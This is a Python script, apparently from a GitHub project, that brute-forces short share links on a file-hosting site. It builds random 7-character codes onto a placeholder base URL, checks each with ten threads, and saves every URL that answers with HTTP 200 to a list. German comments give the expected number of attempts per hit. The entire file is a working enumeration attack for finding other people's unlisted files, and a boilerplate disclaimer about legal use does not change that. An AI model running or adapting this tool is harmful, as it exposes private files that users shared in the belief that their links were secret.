# ────────────────────────────────────────────────
#  📌 Developed by Commit420 | https://github.com/Commit420  
#────────────────────────────────────────────────
#  ✅ Open-source & free to use for legal, experimental purposes.  
#  ⚠️ Unauthorized or illegal use is strictly prohibited.  
# ────────────────────────────────────────────────

# Version 1.0.0
# NC24-weblink-bruteforce#

import requests
import random
import threading
import time
from colorama import Fore, Style, init

init(autoreset=True)

BASE_URL = "https://fileshareblablachangeme.host/i/" # url ohne die zeichen dahinter
CODE_LENGTH = 7 # 7 im durchschnitt ca 160.-170.000 versuche
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# in die datei werden die 200 URLS reingeschrieben
OUTPUT_FILE = "list.txt"

#bruteforce parameter
THREAD_COUNT = 10       
ATTEMPTS = 100000       

# variablen und locks
attempts_remaining = ATTEMPTS
attempts_lock = threading.Lock()
file_lock = threading.Lock()

def generate_code():
    """Generiert einen zufälligen Code mit fester Länge."""
    return ''.join(random.choice(CHARSET) for _ in range(CODE_LENGTH))

def check_url():
    """Funktion für einen Thread: Generiert Codes, baut die URL zusammen und prüft deren Erreichbarkeit."""
    global attempts_remaining
    while True:
        with attempts_lock:
            if attempts_remaining <= 0:
                break
            attempts_remaining -= 1
            current_attempt = ATTEMPTS - attempts_remaining

        code = generate_code()
        url = BASE_URL + code

        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                with file_lock:
                    print(f"{Fore.GREEN}[{current_attempt}] Erreichbar: {url}{Style.RESET_ALL}")
                    with open(OUTPUT_FILE, "a") as f:
                        f.write(url + "\n")
            else:
                print(f"{Fore.RED}[{current_attempt}] Nicht erreichbar: {url} (Status: {response.status_code}){Style.RESET_ALL}")
        except requests.RequestException:
            print(f"{Fore.RED}[{current_attempt}] Fehler beim Prüfen: {url}{Style.RESET_ALL}")
        
        # kleiner break für manche server die schlechter sind 
        time.sleep(0.1)

def main():
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=check_url)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print("Überprüfung abgeschlossen.")

if __name__ == '__main__':
    main()
